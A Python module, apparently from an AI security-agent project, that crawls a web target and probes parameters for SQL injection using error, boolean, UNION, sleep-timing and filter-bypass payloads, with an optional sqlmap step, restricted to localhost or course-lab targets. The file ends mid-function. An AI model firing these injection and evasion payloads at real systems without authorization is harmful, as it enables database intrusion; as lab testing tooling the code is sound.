from __future__ import annotations

import os
import re
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import parse_qs, quote_plus, urlencode, urljoin, urlparse, urlunparse

from ai_security_agent.integrations.http import fetch_text as http_fetch_text
from ai_security_agent.schemas import Finding, ModuleResult

from .common import FetchResult, is_local_or_lab_target, now_iso, safe_fetch_text, target_scope_label
from .followup_bridge import build_sql_scan_followup_context, extract_followup_inputs


FORM_RE = re.compile(r"<form\b([^>]*)>(.*?)</form>", re.IGNORECASE | re.DOTALL)
INPUT_RE = re.compile(r"<input\b[^>]*name\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
INPUT_TAG_RE = re.compile(r"<input\b([^>]*)>", re.IGNORECASE)
TEXTAREA_RE = re.compile(r"<textarea\b([^>]*)>", re.IGNORECASE)
SELECT_RE = re.compile(r"<select\b([^>]*)>", re.IGNORECASE)
ACTION_RE = re.compile(r"\baction\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
METHOD_RE = re.compile(r"\bmethod\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
LINK_RE = re.compile(r"<a\b[^>]*href\s*=\s*['\"]([^'\"]+)['\"]", re.IGNORECASE)
TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.IGNORECASE | re.DOTALL)
SQL_ERROR_RE = re.compile(r"mysql|sql syntax|database error|warning.*mysqli|pdoexception", re.IGNORECASE)
SQL_RESULT_RE = re.compile(r"\b(admin|username|email|database|version\(|user\(\))\b", re.IGNORECASE)
ROUTE_PATH_RE = re.compile(r"(?i)\b(?:GET|POST|PUT|DELETE|PATCH|OPTIONS|HEAD)\s+(\S+)")
ATTR_VALUE_RE = re.compile(r"\b(?P<name>name|value|type)\s*=\s*['\"](?P<value>[^'\"]*)['\"]", re.IGNORECASE)
SQL_SURFACE_PATH_HINTS = (
    "sql",
    "sqli",
    "search",
    "query",
    "filter",
    "find",
    "item",
    "detail",
    "view",
    "product",
    "member",
    "user",
    "account",
)
NON_SQL_CONTEXT_PATH_HINTS = (
    "login",
    "logout",
    "security",
    "setting",
    "setup",
    "install",
    "instruction",
    "readme",
    "help",
    "about",
    "csrf",
    "xss",
    "upload",
    "fileinclude",
    "/fi/",
    "captcha",
    "javascript",
    "csp",
    "weak_id",
)
WEAK_SQL_SIGNAL_NAMES = {"response_delta", "comment_obfuscated", "case_mixed", "space_comment", "plus_space", "tab_space", "newline_space", "paren_wrapped", "operator_symbol", "between_variant", "like_variant", "mysql_version_comment", "dash_comment_suffix", "hash_comment_suffix", "encoding_escape_bypass"}
STRONG_SQL_SIGNAL_NAMES = {"quote_error", "boolean_difference", "time_delay"}

INTERESTING_PARAM_NAMES = {
    "id",
    "uid",
    "user_id",
    "keyword",
    "search",
    "q",
    "name",
    "username",
    "email",
    "sort",
    "page",
}

SKIP_URL_SUFFIXES = (
    ".css",
    ".js",
    ".png",
    ".jpg",
    ".jpeg",
    ".gif",
    ".svg",
    ".ico",
    ".woff",
    ".woff2",
    ".ttf",
    ".map",
)


@dataclass(slots=True)
class Candidate:
    page_url: str
    param_name: str
    source: str
    reason: str
    method: str = "GET"
    normal_value: str = "1"
    quote_value: str = "1'"
    true_value: str = "1 and 1=1"
    false_value: str = "1 and 1=2"
    union_value: str = "1 union select 1,2"
    comment_value: str = "1'/**/or/**/'1'='1"
    extra_params: dict[str, str] | None = None


@dataclass(frozen=True, slots=True)
class PayloadStrategy:
    name: str
    value: str
    kind: str
    note: str
    raw_encoded: bool = False
    timeout_seconds: float = 0.8


def run(target: str, context: dict | None = None, *, use_sqlmap: bool | None = None) -> ModuleResult:
    started = now_iso()
    logs: list[str] = []
    followup_inputs = extract_followup_inputs("sql_scan", context)
    request_headers = _request_headers_from_followup(followup_inputs, context)

    if not is_local_or_lab_target(target):
        return ModuleResult(
            module="sql_scan",
            target=target,
            status="skipped",
            findings=[],
            logs=["Target is outside the local/course-lab allowlist; SQL scan skipped."],
            started_at=started,
            finished_at=now_iso(),
            error="only localhost or course lab targets are allowed",
        )

    page = safe_fetch_text(target, timeout_seconds=2.0, max_bytes=120_000, headers=request_headers or None)
    logs.append(f"Analyzed target entrypoint: {target}")
    logs.append(f"Target scope: {target_scope_label(target)}")
    if request_headers:
        logs.append("Using upstream authenticated request context.")
    logs.append(f"Entrypoint fetch: HTTP {page.status_code}" if page.ok else f"Entrypoint fetch unavailable: {page.error or 'no response'}")

    followup_seed_urls = _dedupe_text_values(_followup_seed_urls(target, followup_inputs) + _state_seed_urls(followup_inputs))
    if followup_seed_urls:
        logs.append(f"Expanded SQL crawl seeds from upstream followup_context: {len(followup_seed_urls)}")
    followup_param_hints = _followup_parameter_hints(followup_inputs)
    if followup_param_hints:
        logs.append(f"Backup-derived SQL parameter hints: {', '.join(followup_param_hints[:6])}")

    crawled_pages = _crawl_same_origin_pages(target, page, extra_seeds=followup_seed_urls, request_headers=request_headers)
    logs.append(f"Crawled same-origin pages: {len(crawled_pages)}")

    candidates: list[Candidate] = []
    for page_url, crawled_page in crawled_pages:
        candidates.extend(_discover_candidates(page_url, crawled_page.text))
    candidates.extend(_followup_seed_candidates(followup_seed_urls, followup_param_hints, candidates))
    candidates = _prioritize_candidates(_dedupe_candidates(candidates))
    logs.append(f"Candidate SQL parameters: {len(candidates)}")

    probes = [_probe_candidate(candidate, request_headers=request_headers) for candidate in candidates[:30]]
    confirmed = [probe for probe in probes if probe["confirmed"]]
    suppressed = [probe for probe in probes if probe.get("suppressed_reason")]
    if suppressed:
        logs.append(f"Suppressed weak SQL-only signals on low-confidence contexts: {len(suppressed)}")
    if _should_use_sqlmap(use_sqlmap):
        logs.append("sqlmap enhanced verification requested.")
        for probe in confirmed[:3]:
            probe["sqlmap"] = _run_sqlmap_for_probe(probe)

    if confirmed:
        findings = [_confirmed_finding(target, probe, probes, page) for probe in confirmed[:6]]
        findings.append(_inventory_finding(target, candidates, probes, page))
    else:
        findings = [_candidate_finding(target, candidates, probes, page)]

    if followup_inputs:
        findings.append(_followup_scope_finding(target, followup_inputs))
        logs.append("Generated SQL follow-up scope from upstream followup_context.")

    result = ModuleResult(
        module="sql_scan",
        target=target,
        status="ok",
        findings=findings,
        logs=logs,
        followup_context=build_sql_scan_followup_context(findings),
        started_at=started,
        finished_at=now_iso(),
    )
    return result


def _discover_candidates(target: str, html: str) -> list[Candidate]:
    candidates: list[Candidate] = []
    parsed = urlparse(target)
    for name in parse_qs(parsed.query):
        candidates.append(_candidate_for(target, name, "query", "Parameter is present in the target URL query string."))

    for attrs, body in FORM_RE.findall(html or ""):
        action_match = ACTION_RE.search(attrs)
        method_match = METHOD_RE.search(attrs)
        action = action_match.group(1) if action_match else target
        method = method_match.group(1).upper() if method_match else "GET"
        page_url = urljoin(target, action)
        form_fields, extra_params = _extract_form_fields(body)
        for name in form_fields:
            if _is_low_value_form_field(name):
                continue
            reason = "Form input name suggests user-controlled input."
            if name.lower() in INTERESTING_PARAM_NAMES:
                reason = "Form input name matches common SQL injection candidate parameters."
            candidates.append(_candidate_for(page_url, name, f"form:{method}", reason, method=method, extra_params=extra_params))

    for href in LINK_RE.findall(html or ""):
        href_url = urljoin(target, href)
        href_query = parse_qs(urlparse(href_url).query)
        for name in href_query:
            candidates.append(
                _candidate_for(
                    href_url,
                    name,
                    "linked-query",
                    "Linked page contains a query parameter that can be reviewed.",
                    method="GET",
                )
            )

    return candidates


def _crawl_same_origin_pages(
    target: str,
    first_page,
    *,
    extra_seeds: list[str] | None = None,
    request_headers: dict[str, str] | None = None,
    max_pages: int = 60,
    max_depth: int = 3,
) -> list[tuple[str, object]]:
    origin = _origin(target)
    visited: set[str] = set()
    results: list[tuple[str, object]] = []
    queue: list[tuple[str, int, object | None]] = [(target, 0, first_page)]
    for seed in extra_seeds or []:
        queue.append((seed, 1, None))

    while queue and len(results) < max_pages:
        url, depth, prefetched = queue.pop(0)
        normalized = _normalize_url(url)
        if normalized in visited or not _is_crawlable_same_origin(normalized, origin):
            continue
        visited.add(normalized)

        fetch = prefetched or safe_fetch_text(normalized, timeout_seconds=0.8, max_bytes=120_000, headers=request_headers or None)
        results.append((normalized, fetch))
        if depth >= max_depth or not getattr(fetch, "text", ""):
            continue

        for href in LINK_RE.findall(fetch.text):
            linked = _normalize_url(urljoin(normalized, href))
            if linked not in visited and _is_crawlable_same_origin(linked, origin):
                queue.append((linked, depth + 1, None))

        for attrs, _body in FORM_RE.findall(fetch.text):
            action_match = ACTION_RE.search(attrs)
            if action_match:
                linked = _normalize_url(urljoin(normalized, action_match.group(1)))
                if linked not in visited and _is_crawlable_same_origin(linked, origin):
                    queue.append((linked, depth + 1, None))

    return results


def _extract_form_fields(html: str) -> tuple[list[str], dict[str, str]]:
    candidate_fields: list[str] = []
    extra_params: dict[str, str] = {}
    for attrs in INPUT_TAG_RE.findall(html or ""):
        parsed = _parse_attrs(attrs)
        name = parsed.get("name", "").strip()
        if not name:
            continue
        input_type = parsed.get("type", "text").strip().lower() or "text"
        value = parsed.get("value", "").strip()
        if input_type in {"submit", "hidden", "button", "image"}:
            extra_params[name] = value or ("submit" if input_type == "submit" else "")
            continue
        candidate_fields.append(name)
    for attrs in TEXTAREA_RE.findall(html or ""):
        parsed = _parse_attrs(attrs)
        name = parsed.get("name", "").strip()
        if name:
            candidate_fields.append(name)
    for attrs in SELECT_RE.findall(html or ""):
        parsed = _parse_attrs(attrs)
        name = parsed.get("name", "").strip()
        if name:
            candidate_fields.append(name)
    return _dedupe_text_values(candidate_fields), {key: value for key, value in extra_params.items() if key}


def _parse_attrs(attrs: str) -> dict[str, str]:
    parsed: dict[str, str] = {}
    for match in ATTR_VALUE_RE.finditer(attrs or ""):
        parsed[str(match.group("name")).lower()] = str(match.group("value"))
    return parsed


def _dedupe_text_values(values: list[str]) -> list[str]:
    seen: set[str] = set()
    result: list[str] = []
    for value in values:
        key = value.strip()
        if not key or key in seen:
            continue
        seen.add(key)
        result.append(key)
    return result


def _candidate_for(
    page_url: str,
    param_name: str,
    source: str,
    reason: str,
    *,
    method: str = "GET",
    extra_params: dict[str, str] | None = None,
) -> Candidate:
    lower_url = page_url.lower()
    lower_name = param_name.lower()
    if lower_name in {"name", "keyword", "search", "q"} or "search" in lower_url:
        true_value = "test%' and '1'='1"
        false_value = "test%' and '1'='2"
        union_value = "test%' union select 1,2 -- "
        comment_value = "test%'/**/or/**/'1'='1"
    elif lower_name in {"id", "uid", "user_id", "page", "sort"}:
        true_value = "1 and 1=1"
        false_value = "1 and 1=2"
        union_value = "1 union select 1,2"
        comment_value = "1/**/or/**/1=1"
    else:
        true_value = "1' and '1'='1"
        false_value = "1' and '1'='2"
        union_value = "1' union select 1,2 -- "
        comment_value = "1'/**/or/**/'1'='1"
    return Candidate(
        page_url=page_url,
        param_name=param_name,
        source=source,
        reason=reason,
        method=method.upper() if method else "GET",
        true_value=true_value,
        false_value=false_value,
        union_value=union_value,
        comment_value=comment_value,
        extra_params=dict(extra_params or {}) or None,
    )


def _dedupe_candidates(candidates: list[Candidate]) -> list[Candidate]:
    seen: set[tuple[str, str, str, str]] = set()
    unique: list[Candidate] = []
    for candidate in candidates:
        parsed = urlparse(candidate.page_url)
        normalized_page = urlunparse(parsed._replace(query="", fragment=""))
        key = (normalized_page, candidate.param_name, candidate.source, candidate.method)
        if key not in seen:
            seen.add(key)
            unique.append(candidate)
    return unique


def _prioritize_candidates(candidates: list[Candidate]) -> list[Candidate]:
    return sorted(candidates, key=_candidate_priority)


def _candidate_priority(candidate: Candidate) -> tuple[int, str, str]:
    url = candidate.page_url.lower()
    name = candidate.param_name.lower()
    score = 100
    if candidate.source == "query":
        score -= 20
    if candidate.source.startswith("linked-query"):
        score -= 16
    if candidate.source.startswith("form:POST"):
        score -= 14
    if candidate.source.startswith("form:GET"):
        score -= 12
    if name in {"id", "uid", "user_id", "name", "keyword", "search", "q"}:
        score -= 20
    if any(token in url for token in ("search", "query", "filter", "find")):
        score -= 18
    if any(token in url for token in ("item", "detail", "view", "delete", "remove", "edit", "profile")):
        score -= 10
    if any(token in url for token in ("bruteforce", "xss", "csrf", "upload", "fileinclude", "rce")):
        score += 25
    if _is_low_confidence_sql_context(candidate):
        score += 35
    if name in {"password", "pass", "submit", "token", "csrf", "captcha"}:
        score += 35
    return (score, candidate.page_url, candidate.param_name)


def _is_low_value_form_field(name: str) -> bool:
    return name.lower() in {"submit", "button", "reset", "token", "csrf", "csrf_token", "captcha"}


def _is_likely_sql_surface(candidate: Candidate) -> bool:
    parsed = urlparse(candidate.page_url)
    path = parsed.path.lower()
    name = candidate.param_name.lower()
    if "sql" in path or "sqli" in path:
        return True
    if any(token in path for token in SQL_SURFACE_PATH_HINTS) and name in {"id", "uid", "user_id", "name", "username", "email", "keyword", "search", "q", "sort"}:
        return True
    return False


def _is_low_confidence_sql_context(candidate: Candidate) -> bool:
    parsed = urlparse(candidate.page_url)
    path = parsed.path.lower()
    name = candidate.param_name.lower()
    if "sql" in path or "sqli" in path:
        return False
    if any(token in path for token in NON_SQL_CONTEXT_PATH_HINTS):
        return True
    return name in {"doc", "page", "file", "path", "test", "phpids", "token", "csrf", "captcha", "password", "pass"}


def _sql_suppression_reason(candidate: Candidate, confirmed_strategies: list[str], basis: list[str]) -> str:
    if not confirmed_strategies:
        return ""
    if not _is_low_confidence_sql_context(candidate):
        return ""
    strong = set(confirmed_strategies) & STRONG_SQL_SIGNAL_NAMES
    weak = set(confirmed_strategies) & WEAK_SQL_SIGNAL_NAMES
    if strong:
        return ""
    if weak or confirmed_strategies:
        return "low-confidence non-SQL context requires SQL error, boolean differential, timing, or database result signal"
    return ""


def _probe_candidate(candidate: Candidate, *, request_headers: dict[str, str] | None = None) -> dict[str, object]:
    baseline_req = _request_for(candidate, candidate.normal_value)
    baseline = _send_probe(baseline_req, timeout_seconds=0.8, max_bytes=80_000, request_headers=request_headers)
    responses: dict[str, tuple[PayloadStrategy, dict[str, str], FetchResult]] = {}
    for strategy in _payload_strategies(candidate):
        req = _request_for(candidate, strategy.value, raw_encoded=strategy.raw_encoded)
        responses[strategy.name] = (
            strategy,
            req,
            _send_probe(req, timeout_seconds=strategy.timeout_seconds, max_bytes=80_000, request_headers=request_headers),
        )

    true_resp = responses["boolean_true"][2]
    false_resp = responses["boolean_false"][2]
    quote_resp = responses["quote_error"][2]
    time_resp = responses["time_delay"][2]

    basis: list[str] = []
    confirmed_strategies: list[str] = []
    quote_error = bool(SQL_ERROR_RE.search(quote_resp.text or ""))
    quote_delta = _response_delta(baseline, quote_resp)
    boolean_delta = _response_delta(true_resp, false_resp)
    time_delta_ms = max(0, int(time_resp.elapsed_ms) - int(baseline.elapsed_ms))
    time_delay_signal = bool(time_resp.ok and time_delta_ms >= 1400)
    if quote_error:
        basis.append("quote_error: single quote response contains SQL/database error markers")
        confirmed_strategies.append("quote_error")
    if quote_delta > 120:
        basis.append(f"response_delta: quote probe differs from baseline by {quote_delta} bytes")
        if _is_likely_sql_surface(candidate):
            confirmed_strategies.append("response_delta")
    if boolean_delta > 30:
        basis.append(f"boolean_difference: true/false response length differs by {boolean_delta} bytes")
        confirmed_strategies.append("boolean_difference")
    if time_delay_signal:
        basis.append(
            f"time_delay: timing probe took {time_resp.elapsed_ms}ms versus baseline {baseline.elapsed_ms}ms "
            f"(delta={time_delta_ms}ms)"
        )
        confirmed_strategies.append("time_delay")

    for name, (strategy, _req, response) in responses.items():
        if strategy.kind not in {"bypass", "union", "encoding"}:
            continue
        baseline_delta = _response_delta(baseline, response)
        false_delta = _response_delta(false_resp, response)
        true_delta = _response_delta(true_resp, response)
        signal = _bypass_signal(response, baseline, true_resp, false_resp)
        if strategy.kind == "union":
            signal = bool(SQL_ERROR_RE.search(response.text or "")) or (
                response.ok
                and bool(SQL_RESULT_RE.search(_remove_reflected_payload(response.text, strategy.value)))
                and baseline_delta > 120
            )
        if signal:
            basis.append(
                f"{strategy.name}: {strategy.note}; "
                f"baseline_delta={baseline_delta}, false_delta={false_delta}, true_delta={true_delta}"
            )
            confirmed_strategies.append(strategy.name)

    if not basis:
        basis.append("no SQL error marker, response delta, or bypass signal was confirmed")
    confirmed_strategies = sorted(set(confirmed_strategies))
    suppressed_reason = _sql_suppression_reason(candidate, confirmed_strategies, basis)
    if suppressed_reason:
        basis.append(f"suppressed: {suppressed_reason}")
        confirmed_strategies = []

    return {
        "candidate": candidate,
        "method": candidate.method,
        "baseline_url": baseline_req["url"],
        "baseline_body": baseline_req.get("body", ""),
        "baseline_status": baseline.status_code,
        "baseline_elapsed_ms": baseline.elapsed_ms,
        "quote_status": quote_resp.status_code,
        "baseline_len": len(baseline.text),
        "quote_len": len(quote_resp.text),
        "true_len": len(true_resp.text),
        "false_len": len(false_resp.text),
        "time_len": len(time_resp.text),
        "time_elapsed_ms": time_resp.elapsed_ms,
        "time_delta_ms": time_delta_ms,
        "union_len": len(responses["union_basic"][2].text),
        "comment_len": len(responses["comment_obfuscated"][2].text),
        "strategy_lengths": {
            name: len(response.text)
            for name, (_strategy, _req, response) in responses.items()
        },
        "quote_error": quote_error,
        "confirmed": bool(confirmed_strategies),
        "confirmed_strategies": confirmed_strategies,
        "suppressed_reason": suppressed_reason,
        "basis": "; ".join(basis),
    }


def _payload_strategies(candidate: Candidate) -> list[PayloadStrategy]:
    true_value = candidate.true_value
    strategies = [
        PayloadStrategy("quote_error", candidate.quote_value, "error", "single quote error probe"),
        PayloadStrategy("boolean_true", true_value, "boolean", "boolean true condition"),
        PayloadStrategy("boolean_false", candidate.false_value, "boolean", "boolean false condition"),
        PayloadStrategy("time_delay", _time_delay_variant(candidate), "timing", "sleep-based timing probe", timeout_seconds=3.2),
        PayloadStrategy("union_basic", candidate.union_value, "union", "basic union-select probe"),
        PayloadStrategy("comment_obfuscated", candidate.comment_value, "bypass", "keyword spacing with inline SQL comments"),
        PayloadStrategy("case_mixed", _case_mix_keywords(true_value), "bypass", "mixed-case keyword variant"),
        PayloadStrategy("space_comment", _replace_spaces(true_value, "/**/"), "bypass", "space replaced with SQL comments"),
        PayloadStrategy("plus_space", _replace_spaces(true_value, "+"), "bypass", "space replaced with plus separators"),
        PayloadStrategy("tab_space", _replace_spaces(true_value, "\t"), "bypass", "space replaced with tab characters"),
        PayloadStrategy("newline_space", _replace_spaces(true_value, "\n"), "bypass", "space replaced with newline characters"),
        PayloadStrategy("paren_wrapped", _wrap_boolean_expression(true_value), "bypass", "boolean expression wrapped in parentheses"),
        PayloadStrategy("operator_symbol", _operator_symbol_variant(true_value), "bypass", "AND/OR keywords replaced with symbolic operators"),
        PayloadStrategy("between_variant", _between_variant(true_value), "bypass", "truth condition expressed with BETWEEN"),
        PayloadStrategy("like_variant", _like_variant(true_value), "bypass", "truth condition expressed with LIKE"),
        PayloadStrategy("mysql_version_comment", _mysql_version_comment_variant(true_value), "bypass", "MySQL version-comment keyword wrapper"),
        PayloadStrategy("dash_comment_suffix", _comment_suffix_variant(true_value, "-- "), "bypass", "SQL line-comment suffix"),
        PayloadStrategy("hash_comment_suffix", _comment_suffix_variant(true_value, "#"), "bypass", "MySQL hash-comment suffix"),
    ]
    if "'" in candidate.true_value:
        strategies.append(
            PayloadStrategy(
                "encoding_escape_bypass",
                "%df%27",
                "encoding",
                "percent-encoded multibyte quote probe for charset/escaping edge cases",
                raw_encoded=True,
            )
        )
    return strategies


def _request_for(candidate: Candidate, value: str, *, raw_encoded: bool = False) -> dict[str, str]:
    parsed = urlparse(candidate.page_url)
    query = parse_qs(parsed.query, keep_blank_values=True)
    for key, extra_value in (candidate.extra_params or {}).items():
        query.setdefault(key, [extra_value])
    if raw_encoded:
        encoded = _build_raw_encoded_params(query, candidate.param_name, value)
    else:
        query[candidate.param_name] = [value]
        encoded = urlencode(query, doseq=True)
    if candidate.method == "POST":
        return {"method": "POST", "url": urlunparse(parsed._replace(query="")), "body": encoded}
    return {"method": "GET", "url": urlunparse(parsed._replace(query=encoded)), "body": ""}


def _build_raw_encoded_params(params: dict[str, list[str]], parameter: str, raw_value: str) -> str:
    pairs: list[str] = []
    for key, values in params.items():
        if key == parameter:
            continue
        for value in values:
            pairs.append(f"{quote_plus(str(key))}={quote_plus(str(value))}")
    pairs.append(f"{quote_plus(parameter)}={raw_value}")
    return "&".join(pairs)


def _send_probe(request_info: dict[str, str], *, timeout_seconds: float, max_bytes: int, request_headers: dict[str, str] | None = None) -> FetchResult:
    if not is_local_or_lab_target(request_info["url"]):
        return FetchResult(url=request_info["url"], error="target is outside the local/course-lab allowlist")
    headers = dict(request_headers or {})
    if request_info.get("method") == "POST":
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    exchange = http_fetch_text(
        request_info["url"],
        method=request_info.get("method", "GET"),
        body=request_info.get("body", ""),
        headers=headers or None,
        timeout_seconds=timeout_seconds,
        max_bytes=max_bytes,
    )
    return FetchResult(
        url=exchange.url,
        status_code=exchange.status_code,
        headers=exchange.headers,
        text=exchange.text,
        error=exchange.error,
        elapsed_ms=exchange.elapsed_ms,
    )


def _confirmed_finding(target: str, probe: dict[str, object], all_probes: list[dict[str, object]], page) -> Finding:
    candidate = probe["candidate"]
    assert isinstance(candidate, Candidate)
    evidence = [
        f"Target: {target}",
        f"Entrypoint fetch: {_fetch_summary(page)}",
        f"Page: {candidate.page_url}",
        f"Parameter: {candidate.param_name}",
        f"Source: {candidate.source}",
        f"Reason: {candidate.reason}",
        "Controlled verification:",
        f"- Method: {probe['method']}",
        f"- Baseline URL: {probe['baseline_url']}",
        f"- Baseline body: {_mask_body(str(probe['baseline_body'])) or 'N/A'}",
        f"- Baseline elapsed ms: {probe['baseline_elapsed_ms']}",
        f"- Quote probe HTTP status: {probe['quote_status']}",
        f"- Baseline length: {probe['baseline_len']}",
        f"- Quote length: {probe['quote_len']}",
        f"- Boolean true length: {probe['true_len']}",
        f"- Boolean false length: {probe['false_len']}",
        f"- Time-delay length: {probe['time_len']}",
        f"- Time-delay elapsed ms: {probe['time_elapsed_ms']}",
        f"- Time-delay delta ms: {probe['time_delta_ms']}",
        f"- Union-style length: {probe['union_len']}",
        f"- Comment-bypass length: {probe['comment_len']}",
        f"- Confirmed strategies: {', '.join(probe['confirmed_strategies']) if probe['confirmed_strategies'] else 'none'}",
        f"- Strategy lengths: {_format_strategy_lengths(probe['strategy_lengths'])}",
        f"Decision basis: {probe['basis']}",
        f"Other candidate parameters reviewed: {len(all_probes)}",
    ]
    sqlmap_result = probe.get("sqlmap")
    if isinstance(sqlmap_result, dict):
        evidence.extend(
            [
                "sqlmap enhanced verification:",
                f"- status: {sqlmap_result.get('status', 'unknown')}",
                f"- command: {sqlmap_result.get('command', '')}",
                f"- summary: {sqlmap_result.get('summary', '')}",
            ]
        )
    return Finding(
        title=f"SQL 注入证据候选参数：{candidate.param_name}",
        severity="high",
        location=_finding_location(candidate),
        evidence="\n".join(evidence),
        kind="vulnerability",
        verification_status="confirmed",
        verified=True,
        recommendation=(
            "Use parameterized queries or prepared statements, validate parameter types server-side, "
            "and suppress database error details in HTTP responses."
        ),
    )


def _candidate_finding(target: str, candidates: list[Candidate], probes: list[dict[str, object]], page) -> Finding:
    evidence = [
        f"Target: {target}",
        f"Entrypoint fetch: {_fetch_summary(page)}",
        f"Candidate count: {len(candidates)}",
    ]
    if candidates:
        evidence.append("Candidate details:")
        for candidate in candidates[:16]:
            evidence.append(f"- page={candidate.page_url}; parameter={candidate.param_name}; source={candidate.source}; reason={candidate.reason}")
    else:
        evidence.append("No query parameters or form inputs were confirmed from the entrypoint page.")

    if probes:
        evidence.append("Probe summary:")
        for probe in probes[:16]:
            candidate = probe["candidate"]
            assert isinstance(candidate, Candidate)
            evidence.append(
                f"- {candidate.param_name} at {candidate.page_url}: "
                f"method={probe['method']}, status={probe['quote_status']}, "
                f"true_len={probe['true_len']}, false_len={probe['false_len']}, basis={probe['basis']}"
            )
    else:
        evidence.append("No candidate probe was executed because no candidate parameter was available.")

    return Finding(
        title="SQL 注入候选参数复核",
        severity="high",
        location=", ".join(f"{item.page_url}:{item.param_name}" for item in candidates[:4]) or "no confirmed parameter",
        evidence="\n".join(evidence),
        kind="candidate",
        verification_status="unconfirmed",
        verified=False,
        recommendation=(
            "Manually review the listed parameters in the authorized lab, then fix risky endpoints with prepared "
            "statements, strict input validation, and generic database error handling."
        ),
    )


def _inventory_finding(target: str, candidates: list[Candidate], probes: list[dict[str, object]], page) -> Finding:
    inventory = _candidate_finding(target, candidates, probes, page)
    return Finding(
        title="SQL 注入候选参数清单",
        severity="info",
        location=inventory.location,
        evidence=inventory.evidence,
        kind="evidence",
        verification_status="informational",
        verified=False,
        recommendation=inventory.recommendation,
    )


def _fetch_summary(fetch) -> str:
    if fetch.ok:
        title = _extract_title(fetch.text)
        return f"HTTP {fetch.status_code}" + (f", title={title}" if title else "")
    return fetch.error or "not available"


def _extract_title(html: str) -> str:
    match = TITLE_RE.search(html or "")
    if not match:
        return ""
    return re.sub(r"\s+", " ", match.group(1)).strip()


def _mask_body(body: str) -> str:
    if not body:
        return ""
    return re.sub(r"(?i)(password|pass|pwd)=[^&]*", r"\1=[masked]", body)


def _finding_location(candidate: Candidate) -> str:
    parsed = urlparse(candidate.page_url)
    clean_url = urlunparse(parsed._replace(query="", fragment=""))
    return f"{clean_url}?{candidate.param_name}=[controlled-test]"


def _remove_reflected_payload(text: str, payload: str) -> str:
    if not text:
        return ""
    cleaned = text
    for value in {payload, payload.replace(" ", "+"), payload.replace(" ", "%20")}:
        cleaned = cleaned.replace(value, "")
    return cleaned


def _response_delta(left: FetchResult, right: FetchResult) -> int:
    if not left.ok or not right.ok:
        return 0
    return abs(len(left.text) - len(right.text))


def _case_mix_keywords(value: str) -> str:
    replacements = {
        " and ": " AnD ",
        " or ": " oR ",
        " union ": " UnIoN ",
        " select ": " SeLeCt ",
    }
    mixed = value
    for old, new in replacements.items():
        mixed = mixed.replace(old, new)
    return mixed


def _replace_spaces(value: str, replacement: str) -> str:
    return re.sub(r"\s+", replacement, value.strip())


def _wrap_boolean_expression(value: str) -> str:
    return re.sub(r"(?i)\band\b\s+(.+)$", r"and (\1)", value, count=1)


def _operator_symbol_variant(value: str) -> str:
    return re.sub(r"(?i)\band\b", "&&", value)


def _between_variant(value: str) -> str:
    if "'1'='1" in value:
        return value.replace("'1'='1", "'1' between '0' and '2'")
    if "1=1" in value:
        return value.replace("1=1", "1 between 0 and 2")
    return value


def _like_variant(value: str) -> str:
    if "'1'='1" in value:
        return value.replace("'1'='1", "'1' like '1'")
    if "1=1" in value:
        return value.replace("1=1", "1 like 1")
    return value


def _time_delay_variant(candidate: Candidate) -> str:
    lower_name = candidate.param_name.lower()
    lower_url = candidate.page_url.lower()
    if lower_name in {"name", "keyword", "search", "q"} or "search" in lower_url:
        return "test%' and if(1=1,sleep(2),0) and '1'='1"
    if lower_name in {"id", "uid", "user_id", "page", "sort"}:
        return "1 and if(1=1,sleep(2),0)"
    return "1' and if(1=1,sleep(2),0) and '1'='1"


def _mysql_version_comment_variant(value: str) -> str:
    return re.sub(r"(?i)\band\b", "/*!50000AnD*/", value)


def _comment_suffix_variant(value: str, suffix: str) -> str:
    return value.rstrip() + suffix


def _bypass_signal(response: FetchResult, baseline: FetchResult, true_resp: FetchResult, false_resp: FetchResult) -> bool:
    if not response.ok:
        return False
    if SQL_ERROR_RE.search(response.text or ""):
        return True
    baseline_delta = _response_delta(baseline, response)
    false_delta = _response_delta(false_resp, response)
    true_delta = _response_delta(true_resp, response)
    if baseline_delta > 120 and false_delta > 120:
        return True
    if true_resp.ok and false_resp.ok and true_delta <= 40 and false_delta > 120:
        return True
    return False


def _format_strategy_lengths(lengths: object) -> str:
    if not isinstance(lengths, dict):
        return ""
    items = [f"{name}={length}" for name, length in sorted(lengths.items())]
    return ", ".join(items[:16])


def _followup_scope_finding(target: str, followup_inputs: dict[str, object]) -> Finding:
    inferred_param_hints = _followup_parameter_hints(followup_inputs)
    return Finding(
        title="Backup-derived SQL follow-up scope",
        severity="info",
        location=target,
        evidence=_join_evidence(
            "This follow-up module was seeded from upstream backup_audit_extended hints.",
            _format_values("inferred_param_hints", inferred_param_hints),
            _format_values("api_paths", followup_inputs.get("api_paths", [])),
            _format_values("auth_paths", followup_inputs.get("auth_paths", [])),
            _format_values("framework_routes", followup_inputs.get("framework_routes", [])),
            _format_values("route_prefixes", followup_inputs.get("route_prefixes", [])),
            _format_values("controller_hints", followup_inputs.get("controller_hints", [])),
            _format_values("config_entrypoints", followup_inputs.get("config_entrypoints", [])),
            _format_values("download_export_paths", followup_inputs.get("download_export_paths", [])),
            _format_values("upload_import_paths", followup_inputs.get("upload_import_paths", [])),
            _format_values("artifact_name_hints", followup_inputs.get("artifact_name_hints", [])),
            _format_values("middleware_hints", followup_inputs.get("middleware_hints", [])),
            _format_values("db_hosts", followup_inputs.get("db_hosts", [])),
            _format_values("frameworks", followup_inputs.get("frameworks", [])),
            _format_values("source_paths", followup_inputs.get("source_paths", [])),
            _format_values("correlated_discovery_seeds", followup_inputs.get("correlated_discovery_seeds", [])),
            _format_values("relationship_followup_seeds", followup_inputs.get("relationship_followup_seeds", [])),
            _format_values(
                "relationship_followup_items",
                _format_relationship_items(followup_inputs.get("relationship_followup_items", [])),
            ),
            _format_values("exposed_artifacts", followup_inputs.get("exposed_artifacts", [])),
        ),
        kind="scope",
        verification_status="informational",
        verified=False,
        recommendation="Use backup-derived route, auth, and database hints to prioritize later SQL validation.",
    )


def _format_values(label: str, values: object) -> str:
    if not isinstance(values, list) or not values:
        return ""
    return f"{label}={', '.join(str(value) for value in values[:6])}"


def _join_evidence(*parts: str) -> str:
    return "; ".join(part for part in parts if part)


def _format_relationship_items(items: object) -> list[str]:
    if not isinstance(items, list):
        return []
